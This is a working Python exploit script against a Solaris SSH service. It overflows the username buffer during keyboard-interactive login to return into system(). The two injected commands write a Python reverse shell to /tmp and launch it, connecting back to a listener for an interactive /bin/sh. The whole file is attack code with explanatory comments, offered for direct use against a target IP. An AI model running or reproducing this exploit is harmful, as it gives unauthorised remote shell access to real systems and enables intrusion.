#!/usr/bin/env python3

def exploit(CMD):
	#Restrictions: in the overflowed buffer, the characters, tab(0x08) space(0x20) and null(0x00) cause the copy to immediately be aborted, and
	#nothing after it will be copied.
	#we use $IFS in place of a space. bash and sh will nicely replace this before executing the command.
	CMD = CMD.replace(b' ',b'$IFS') # replace space with the shell-delimeter(default is space)
	CMD = CMD.replace(b'\t',b'$IFS$IFS$IFS$IFS') # replace tabs with 4 spaces
	CMD = CMD.replace(b'\n',b';') # replace newline with ;
	CMD = CMD.replace(b'\r',b'') # remove carriage return
	CMD = CMD.replace(b"'",b"\\'") # escape quotes


	EXPLOIT = b"bash$IFS-c$IFS'" + CMD + b";';$IFS#" #perform commands in a bash subshell for predictability

	padding = 512 - len(EXPLOIT) #ensure padding
	if padding < 0:
		print("command too long! shorten the command and retry, bailing out!")
		exit(1)


	### the meat of the exploit ###
	EXPLOIT += b"#" * padding
		              #lsb            msb
	EXPLOIT += bytearray([0xfb,0xff,0xff,0xfe])#filler, this value will be pop-ed into $EBP before parse_user_name() is exited. the original value cannot be preserved, as it contains a 0x08 which will cause early termination of the copy-function that we are overflowing. therefore, a random, but valid memory location is chosen

	EXPLOIT += bytearray([0xc3,0x1e,0xbb,0xfe])
	#EXPLOIT += bytearray([0xdf,0x1e,0xc2,0xfe])#pointer to system() (address is LSB to MSB), we return into this function when we jump out parse_user_name()
	#pointer is FEB90000? now is FEB20000

	EXPLOIT += bytearray([0xa8,0x32,0xff,0xfe])#filler, is the **username pointer. the original value cannot be preserved, as it contains a 0x08 which will cause early termination of the copy-function that we are overflowing. therefore, a random, but valid memory location is chosen

	EXPLOIT += bytearray([0xb4,0x33,0x04,0x00]) #
	#EXPLOIT += bytearray([0xb4,0x33,0x04,0x00]) #refer to own address on stack, as strcpy will replace it with a pointer to the string
	#note that the msb(far right) is a null, which denotes the end of the copy command, and will not be overflowed. this is
	#intentional, as the character needs to be 0x08, which it allready is. attempting to write 0x08 will cause the copy-routine to break
	### end of meat of exploit ###

	return EXPLOIT

def ssh_interact(ip, payload):
	import paramiko
	# Handler for server questions, we respond to the "Please enter user name:" with a username of more then 512 bytes, triggering a buffer overflow
	def answer_handler(title, instructions, prompt_list):
		resp = []
		if prompt_list[0][0].startswith("Please enter user name:"): # ensure we reply to the right request
			resp.append(payload)
		return resp

	client = paramiko.Transport((ip, 22))
	client.start_client(timeout=3600) # necesary for unknown paramiko reason

	client.auth_timeout = 3600
	client.banner_timeout = 3600
	client.handshake_timeout = 3600
	try:
		client.auth_interactive(username="", handler=answer_handler)
	except:
		pass #ensure connection exceptions are caught silently
	client.close() 


TARGET_IP = "192.168.253.130" # set this to "" for offline payload generation, or to the target IP to directly connect from this script

REVERSE_IP = b'192.168.1.1' # IP where nc -nlp REVERSE_PORT is listening
REVERSE_PORT = b'8080' # reverse port to connect to from the solaris machine
TEMP_FILE = b'/tmp/tmp.aIoQWc.py'

CMD1 = b'echo -ne "import\\x20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"' + REVERSE_IP + b'\\",' + REVERSE_PORT + b'));os.dup2(s.fileno(),0);\\x20os.dup2(s.fileno(),1);\\x20os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);" >' + TEMP_FILE
CMD2 = b'python ' + TEMP_FILE + b'; disown'

payload1 = exploit(CMD1) #write the python shell to the victim at /tmp/tmp.aIoQWc.py
payload2 = exploit(CMD2) #run the python shell /tmp/tmp.aIoQWc.py

if TARGET_IP != "": #pure python using paramiko as ssh client
	ssh_interact(TARGET_IP,payload1)
	ssh_interact(TARGET_IP,payload2)
else: # write payloads to file, for use with jsch java based ssh client
	file1 = open("payload1.bin", "wb")
	file1.write(payload1)
	file1.close()
	file2 = open("payload2.bin", "wb")
	file2.write(payload2)
	file2.close()

